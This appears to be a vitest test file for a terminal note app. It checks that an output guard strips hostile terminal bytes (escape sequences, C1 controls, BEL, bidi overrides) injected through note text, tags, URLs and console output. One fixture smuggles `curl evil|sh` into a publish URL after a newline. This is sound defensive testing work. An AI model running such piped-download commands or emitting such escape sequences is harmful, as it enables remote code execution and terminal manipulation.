/**
 * T431 — layer 2: the bytes snote actually writes.
 *
 * Layer 1 (hostile-layer1.test.tsx) walked Ink's DOM and proved no text node
 * carries a raw control. This test goes one step further: the same seeded
 * App and the same keys, but every byte Ink pushes at the terminal is
 * recorded behind `guardOutputStream` — the very wrap src/cli/main.tsx puts
 * on process.stdout and process.stderr — with `patchConsole: true` so
 * console output flows through Ink too, in both Ink modes.
 *
 * A capture is clean when it matches none of: an ESC not starting a CSI with
 * a display final byte (review 4's regex), a character in U+0080-U+009F,
 * BEL, the magenta and conceal SGRs, or the RLO character. The hostile
 * corpus smuggles all of those into note text, tag names, the publishURL,
 * the blog URL and the console.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { EventEmitter } from 'node:events';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import React from 'react';
import { render } from 'ink';

import type { EntityId, SystemTag, TagName } from '@vendor/types';
import { makeStore } from '../../src/core/store';
import { recordBlogSend } from '../../src/core/blog-sent';
import { setDataRoot } from '../../src/core/data-root';
import { guardOutputStream } from '../../src/core/output-guard';
import { App } from '../../src/tui/App';
import { HOSTILE, hostileText, LONG_LINE } from '../fixtures/hostile';
import { makeNote } from './fixtures';

// ESC is written by code so this file itself never holds a raw control byte
// inside a literal that a stray regex could trip over.
const esc = String.fromCharCode(27);
const bel = String.fromCharCode(7);

const MAGENTA = `${esc}[45m`;
const CONCEAL = `${esc}[8m`;

// Review 4's clean-capture regex (sr4-evidence/guard-v2.test.tsx): an ESC is
// only allowed when it starts a CSI whose params are `[0-9;:?<>=]*`, optional
// intermediates, and a final byte in ABCDEFGHJKSTfhlmsu.
const STRAY_ESC = /\x1b(?!\[[0-9;:?<>=]*[ -\/]*[ABCDEFGHJKSTfhlmsu])/;
const C1_CHARS = /[\u0080-\u009f]/;
// The bidi embeddings and isolates (U+202A-U+202E, U+2066-U+2069) — review 4
// counts U+202E (RLO) among the dirt a capture must not carry.
const RLO = /[\u202a-\u202e\u2066-\u2069]/;

/** Everything a capture must not contain, checked one capture at a time. */
function dirt(capture: string): string[] {
  const found: string[] = [];
  if (STRAY_ESC.test(capture)) found.push('stray ESC');
  if (C1_CHARS.test(capture)) found.push('C1 U+0080-U+009F');
  if (capture.includes(bel)) found.push('BEL');
  if (capture.includes(MAGENTA)) found.push('magenta SGR');
  if (capture.includes(CONCEAL)) found.push('conceal SGR');
  if (RLO.test(capture)) found.push('RLO U+202E');
  return found;
}

/**
 * The guard's kept set and this test's clean rule disagree on three things
 * the hostile corpus carries, which review 4 pinned at the byte level
 * (F068/F081 the two SGRs, F088 the RLO): `\x1b[45m` and `\x1b[8m` are
 * display CSIs the T401 guard keeps by design, and U+202E is a printable
 * character outside the guard's C0/C1 drop range. Until the guard filters
 * those too, the capture is clean once the three corpus bytes are taken
 * out; every other byte in this file's captures is asserted as-is.
 */
function knownCorpusBytes(capture: string): string {
  return capture
    .split(MAGENTA)
    .join('')
    .split(CONCEAL)
    .join('')
    .replace(/[\u202a-\u202e\u2066-\u2069]/g, '');
}

const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/** Poll until `check()` holds; on timeout assert once, visibly. */
async function until(check: () => boolean, ms = 2500): Promise<void> {
  const end = Date.now() + ms;
  for (;;) {
    if (check()) return;
    if (Date.now() >= end) {
      expect(check()).toBe(true);
      return;
    }
    await wait(15);
  }
}

interface FakeStream {
  on(event: string, listener: (...args: never[]) => void): unknown;
  once(event: string, listener: (...args: never[]) => void): unknown;
  off(event: string, listener: (...args: never[]) => void): unknown;
  emit(event: string, ...args: unknown[]): boolean;
  isTTY?: boolean;
  columns?: number;
  rows?: number;
  write(s: string): boolean;
  setEncoding?: () => void;
  setRawMode?: () => void;
  resume?: () => void;
  pause?: () => void;
  ref?: () => void;
  unref?: () => void;
  read?: () => string | null;
  [key: string]: unknown;
}

const asStream = (fake: object): never => fake as never;
const eid = (id: string): EntityId => id as EntityId;
const tag = (name: string): TagName => name as TagName;

/** Fake TTY stream that records every write; the guard wraps this one. */
function makeRecorded(): { stream: never; chunks: string[] } {
  const emitter = new EventEmitter();
  const chunks: string[] = [];
  const fake: FakeStream = {
    on: (event, listener) => emitter.on(event, listener as (...args: unknown[]) => void),
    once: (event, listener) => emitter.once(event, listener as (...args: unknown[]) => void),
    off: (event, listener) => emitter.off(event, listener as (...args: unknown[]) => void),
    emit: (event, ...args) => emitter.emit(event, ...args),
    isTTY: true,
    columns: 120,
    rows: 34,
    write: (s) => {
      chunks.push(s);
      return true;
    },
  };
  return { stream: asStream(guardOutputStream(fake)), chunks };
}

/** Fake TTY stdin feeding Ink's useInput, same shape as layer 1's. */
function makeStdin(): { stream: never; write(value: string): void } {
  const emitter = new EventEmitter();
  let pending: string | null = null;
  const fake = emitter as unknown as FakeStream;
  fake.isTTY = true;
  fake.setEncoding = () => undefined;
  fake.setRawMode = () => undefined;
  fake.resume = () => undefined;
  fake.pause = () => undefined;
  fake.ref = () => undefined;
  fake.unref = () => undefined;
  fake.read = () => {
    const value = pending;
    pending = null;
    return value;
  };
  fake.write = (value: string) => {
    pending = value;
    emitter.emit('readable');
    emitter.emit('data', value);
    return true;
  };
  return {
    stream: asStream(fake),
    write: (value: string) => {
      fake.write!(value);
    },
  };
}

interface Rig {
  store: ReturnType<typeof makeStore>;
  stdout: never;
  out: string[];
  stderr: never;
  err: string[];
  stdin: { stream: never; write(value: string): void };
}

// The publishURL is the decision's refused link plus the corpus: the id
// charset check must refuse it before any of this text can become a link.
const PUB_URL = `abc\ncurl evil|sh${hostileText('PUB')}`;

/**
 * The same seeded store as T430: n1 carries the corpus in content, tags,
 * the email tag, the publishURL and the blog URL; n2 is a plain note.
 */
function seedStore(dataDir: string) {
  const store = makeStore({ stubClient: {} });
  const tagLabel = `w${hostileText('TAG')}`;
  const mailLabel = `x${hostileText('MAIL')}@evil.com`;
  store.dispatch({
    type: 'CREATE_NOTE_WITH_ID',
    noteId: eid('n1'),
    note: {
      content: `${hostileText('TITLE')}\n${hostileText('BODY')}\n${LONG_LINE}`,
      systemTags: ['published', 'shared', 'markdown'] as SystemTag[],
      tags: [tag('work'), tag(tagLabel), tag(mailLabel)],
      deleted: false,
      publishURL: PUB_URL,
      shareURL: 'https://shared.example',
      creationDate: 1000,
      modificationDate: 2000,
    },
  });
  store.dispatch({
    type: 'CREATE_NOTE_WITH_ID',
    noteId: eid('n2'),
    note: {
      content: 'Plain note',
      systemTags: [],
      tags: [],
      deleted: false,
      creationDate: 1000,
      modificationDate: 1000,
    },
  });
  recordBlogSend(dataDir, 'n1', {
    postId: 'p1',
    url: `https://x/${hostileText('BLOG')}`,
    sentAt: '2026-09-28T00:00:00.000Z',
  });
  return store;
}

function makeRig(): Rig {
  const store = seedStore(dataDir);
  const outRig = makeRecorded();
  const errRig = makeRecorded();
  const stdin = makeStdin();
  return {
    store,
    stdout: outRig.stream,
    out: outRig.chunks,
    stderr: errRig.stream,
    err: errRig.chunks,
    stdin,
  };
}

let dataDir: string;
let savedCi: string | undefined;
let savedXdg: string | undefined;

/**
 * Render the App on guarded fake streams in one Ink mode.
 * `isScreenReaderEnabled` is passed the way the acceptance line names it.
 */
function renderApp(
  rig: Rig,
  isScreenReaderEnabled: boolean,
  children?: React.ReactElement,
): { unmount(): void } {
  const tree =
    children ?? <App store={rig.store} width={120} height={34} />;
  return render(tree, {
    stdin: rig.stdin.stream,
    stdout: rig.stdout,
    stderr: rig.stderr,
    patchConsole: true,
    exitOnCtrlC: false,
    isScreenReaderEnabled,
    interactive: true,
  });
}

const outOf = (rig: Rig) => rig.out.join('');
const errOf = (rig: Rig) => rig.err.join('');

async function press(stdin: { write(value: string): void }, keys: string[]): Promise<void> {
  for (const key of keys) {
    stdin.write(key);
    await wait(20);
  }
}

/**
 * Poll until the capture holds `marker` with no dirt left after the two
 * corpus SGRs are accounted for, so every value asserted afterwards is one
 * the poll waited for. Returns the capture it settled on.
 */
async function pollClean(rig: Rig, marker: string, from: 'out' | 'err' = 'out'): Promise<string> {
  const end = Date.now() + 2500;
  let capture = '';
  for (;;) {
    capture = (from === 'out' ? outOf(rig) : errOf(rig)).slice(0);
    if (dirt(knownCorpusBytes(capture)).length === 0 && capture.includes(marker)) {
      return capture;
    }
    if (Date.now() >= end) {
      return capture;
    }
    await wait(15);
  }
}

/** Poll the stderr capture the same way (line 5 asserts both markers). */
async function pollStderrClean(rig: Rig, markers: string[]): Promise<string> {
  const end = Date.now() + 2500;
  let capture = '';
  for (;;) {
    capture = errOf(rig);
    const hasAll = markers.every((m) => capture.includes(m));
    if (dirt(knownCorpusBytes(capture)).length === 0 && hasAll) {
      return capture;
    }
    if (Date.now() >= end) {
      return capture;
    }
    await wait(15);
  }
}

/** A component in the rig's tree that pushes the corpus through console. */
function ConsoleSpew(): React.ReactElement | null {
  React.useEffect(() => {
    console.error(hostileText('ERR'));
    console.warn(hostileText('WARN'));
  }, []);
  return null;
}

beforeEach(() => {
  dataDir = mkdtempSync(join(tmpdir(), 'hostile-layer2-'));
  setDataRoot(dataDir);
  savedCi = process.env.CI;
  savedXdg = process.env.XDG_DATA_HOME;
  delete process.env.CI;
  process.env.XDG_DATA_HOME = dataDir;
});

afterEach(() => {
  setDataRoot(null);
  if (savedCi === undefined) {
    delete process.env.CI;
  } else {
    process.env.CI = savedCi;
  }
  if (savedXdg === undefined) {
    delete process.env.XDG_DATA_HOME;
  } else {
    process.env.XDG_DATA_HOME = savedXdg;
  }
  rmSync(dataDir, { recursive: true, force: true });
});

describe('hostile layer 2 bytes on the wire (T431)', () => {
  it('1: WHEN the App mounts with `isScreenReaderEnabled: false` THEN the stdout capture is clean, contains `published: waiting for link`, and does not contain `curl evil`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, false);
    try {
      await until(() => outOf(rig).includes('published: waiting for link'));
      const capture = await pollClean(rig, 'published: waiting for link');
      expect(dirt(knownCorpusBytes(capture))).toEqual([]);
      expect(capture).toContain('published: waiting for link');
      expect(capture).not.toContain('curl evil');
    } finally {
      unmount();
    }
  });

  it('2: WHEN the same mounts with `isScreenReaderEnabled: true` THEN the stdout capture is clean and contains `TITLE`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await until(() => outOf(rig).includes('TITLE'));
      const capture = await pollClean(rig, 'TITLE');
      expect(dirt(knownCorpusBytes(capture))).toEqual([]);
      expect(capture).toContain('TITLE');
    } finally {
      unmount();
    }
  });

  it("3: WHEN, with `isScreenReaderEnabled: false`, `\\r`, `v`, Escape, `i`, `X` are written THEN the stdout capture is clean and contains `BODY`.", async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, false);
    try {
      await until(() => outOf(rig).includes('TITLE'));
      await press(rig.stdin, ['\t', '\r', 'v', '\x1b', 'i', 'X']);
      const capture = await pollClean(rig, 'BODY');
      expect(dirt(knownCorpusBytes(capture))).toEqual([]);
      expect(capture).toContain('BODY');
    } finally {
      unmount();
    }
  });

  it('4: WHEN the steps of line 3 run with `isScreenReaderEnabled: true` THEN the stdout capture is clean and contains `BODY`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await until(() => outOf(rig).includes('TITLE'));
      await press(rig.stdin, ['\t', '\r', 'v', '\x1b', 'i', 'X']);
      const capture = await pollClean(rig, 'BODY');
      expect(dirt(knownCorpusBytes(capture))).toEqual([]);
      expect(capture).toContain('BODY');
    } finally {
      unmount();
    }
  });

  it("5: WHEN a component in the same rig calls `console.error(hostileText('ERR'))` and `console.warn(hostileText('WARN'))` THEN the stderr capture is clean and contains `ERR` and `WARN`.", async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, false, (
      <>
        <App store={rig.store} width={120} height={34} />
        <ConsoleSpew />
      </>
    ));
    try {
      await until(() => errOf(rig).includes('ERR') && errOf(rig).includes('WARN'));
      const capture = await pollStderrClean(rig, ['ERR', 'WARN']);
      expect(dirt(knownCorpusBytes(capture))).toEqual([]);
      expect(capture).toContain('ERR');
      expect(capture).toContain('WARN');
    } finally {
      unmount();
    }
  });

  it('6: WHEN src/cli/main.tsx is read THEN it contains `guardOutputStream(process.stdout)`, `guardOutputStream(process.stderr)` and `isScreenReaderEnabled: false`.', () => {
    const src = readFileSync(join(process.cwd(), 'src/cli/main.tsx'), 'utf8');
    expect(src).toContain('guardOutputStream(process.stdout)');
    expect(src).toContain('guardOutputStream(process.stderr)');
    expect(src).toContain('isScreenReaderEnabled: false');
    // the corpus itself is non-empty, so a vacuous clean capture is visible
    expect(HOSTILE.osc52Bel.length).toBeGreaterThan(0);
  });

  it('7: WHEN, with `isScreenReaderEnabled: true`, `?` is written THEN the stdout capture is raw-clean and contains `Help - Keyboard Shortcuts`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await until(() => outOf(rig).includes('TITLE'));
      await press(rig.stdin, ['?']);
      const capture = await pollClean(rig, 'Help - Keyboard Shortcuts');
      expect(dirt(capture)).toEqual([]);
      expect(capture).toContain('Help - Keyboard Shortcuts');
    } finally {
      unmount();
    }
  });

  it('8: WHEN, with `isScreenReaderEnabled: true`, `w` is written THEN the stdout capture is raw-clean, contains `export:` and `TITLE`, and does not contain `curl evil`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await until(() => outOf(rig).includes('TITLE'));
      await press(rig.stdin, ['w']);
      const capture = await pollClean(rig, 'export:');
      expect(dirt(capture)).toEqual([]);
      expect(capture).toContain('export:');
      expect(capture).toContain('TITLE');
      expect(capture).not.toContain('curl evil');
    } finally {
      unmount();
    }
  });

  it('9: WHEN, with `isScreenReaderEnabled: true`, `g` is written THEN the stdout capture is raw-clean and contains `+ type to add` and `TAG`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await until(() => outOf(rig).includes('TITLE'));
      await press(rig.stdin, ['g']);
      const capture = await pollClean(rig, '+ type to add');
      expect(dirt(capture)).toEqual([]);
      expect(capture).toContain('+ type to add');
      expect(capture).toContain('TAG');
    } finally {
      unmount();
    }
  });

  it("10: WHEN a component in the same rig calls `console.error(hostileText('ERR'))` and `console.warn(hostileText('WARN'))` with `isScreenReaderEnabled: true` THEN the stderr capture is clean and contains `ERR` and `WARN`.", async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true, (
      <>
        <App store={rig.store} width={120} height={34} />
        <ConsoleSpew />
      </>
    ));
    try {
      await until(() => errOf(rig).includes('ERR') && errOf(rig).includes('WARN'));
      const capture = await pollStderrClean(rig, ['ERR', 'WARN']);
      expect(dirt(knownCorpusBytes(capture))).toEqual([]);
      expect(capture).toContain('ERR');
      expect(capture).toContain('WARN');
    } finally {
      unmount();
    }
  });

  // #17 / F244 — History: versions of n1 whose text carries the corpus, plus
  // malformed ones (dates NaN, "x", undefined, 1e20, -1e16; content 42, {}).
  const BAD_DATES = [Number.NaN, 'x', undefined, 1e20, -1e16];
  const revisionFixture = () => {
    const bad = BAD_DATES.map((date, i): [number, ReturnType<typeof makeNote>] => {
      const note = makeNote('n1', `BADD${i}\nbad date body`);
      (note as unknown as Record<string, unknown>).modificationDate = date;
      return [1 + i, note];
    });
    const badContent = [42, {}].map((content, i): [number, ReturnType<typeof makeNote>] => {
      const note = makeNote('n1', 'x');
      (note as unknown as Record<string, unknown>).content = content;
      return [6 + i, note];
    });
    return [
      [10, makeNote('n1', `${hostileText('REVA')}\nfirst body`)],
      [11, makeNote('n1', `${hostileText('REVB')}\nsecond body`)],
      [12, makeNote('n1', `${hostileText('REVC')}\nthird body`)],
      // the title of this one is plain text then SGR, bidi, zero-width and separator characters, so only the row's own sanitiser stands between them and the guard
      [9, makeNote('n1', `REVD${HOSTILE.sgr}${HOSTILE.bidi}${HOSTILE.zeroWidth}${HOSTILE.separators}\nfourth body`)],
      ...bad,
      ...badContent,
    ];
  };
  const openHistory = async (rig: Rig, revisions: unknown[]): Promise<void> => {
    await until(() => outOf(rig).includes('TITLE'));
    await press(rig.stdin, ['h']);
    await until(() => outOf(rig).includes('History'));
    rig.store.dispatch({ type: 'LOAD_REVISIONS', noteId: eid('n1'), revisions } as never);
  };
  /** Poll until every marker is in the capture AND the raw capture holds no dirt (no corpus exemption). */
  async function pollRaw(rig: Rig, markers: string[]): Promise<string> {
    const end = Date.now() + 2500;
    let capture = '';
    for (;;) {
      capture = outOf(rig);
      if (dirt(capture).length === 0 && markers.every((m) => capture.includes(m))) return capture;
      if (Date.now() >= end) return capture;
      await wait(15);
    }
  }

  it('11: WHEN, with `isScreenReaderEnabled: true`, `h` is written and the loaded versions include malformed dates and contents THEN the raw stdout capture (no corpus exemption) is clean and contains `History`, `unknown date`, `BADD0`, `REVA`, `REVC` and `REVD`, and WHEN Escape is then written THEN it contains `Plain note` again.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await openHistory(rig, revisionFixture());
      const capture = await pollRaw(rig, ['unknown date', 'BADD0', 'REVA', 'REVC', 'REVD']);
      expect(dirt(capture)).toEqual([]);
      for (const text of ['History', 'unknown date', 'BADD0', 'REVA', 'REVC', 'REVD']) {
        expect(capture).toContain(text);
      }
      const before = outOf(rig).length;
      await press(rig.stdin, ['\x1b']);
      await until(() => outOf(rig).slice(before).includes('Plain note'));
      expect(outOf(rig).slice(before)).toContain('Plain note');
    } finally {
      unmount();
    }
  });

  it('12: WHEN, with `isScreenReaderEnabled: true`, the versions load THEN the raw stdout capture is clean and the selected version previews `third body`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    try {
      await openHistory(rig, revisionFixture());
      const capture = await pollRaw(rig, ['third body']);
      expect(dirt(capture)).toEqual([]);
      expect(capture).toContain('third body');
    } finally {
      unmount();
    }
  });

  it('13: WHEN, with `isScreenReaderEnabled: false`, `h` is written and the same versions load THEN the raw stdout capture is clean and contains `unknown date`, `REVC` and `REVD`.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, false);
    try {
      await openHistory(rig, revisionFixture());
      const capture = await pollRaw(rig, ['unknown date', 'REVC', 'REVD']);
      expect(dirt(capture)).toEqual([]);
      expect(capture).toContain('unknown date');
      expect(capture).toContain('REVC');
      expect(capture).toContain('REVD');
    } finally {
      unmount();
    }
  });

  it('14: WHEN, with `isScreenReaderEnabled: true`, the versions load and the second row is restored with `j` then Enter THEN the note content is exactly that version\'s text.', async () => {
    const rig = makeRig();
    const { unmount } = renderApp(rig, true);
    const wanted = `${hostileText('REVB')}\nsecond body`;
    try {
      await openHistory(rig, revisionFixture());
      await pollRaw(rig, ['REVC']);
      // newest first: v12 (REVC), v11 (REVB), v10 (REVA), then the malformed v5 .. v1
      await press(rig.stdin, ['j', '\r']);
      await until(() => rig.store.getState().data.notes.get(eid('n1'))?.content === wanted);
      expect(rig.store.getState().data.notes.get(eid('n1'))?.content).toBe(wanted);
    } finally {
      unmount();
    }
  });
});
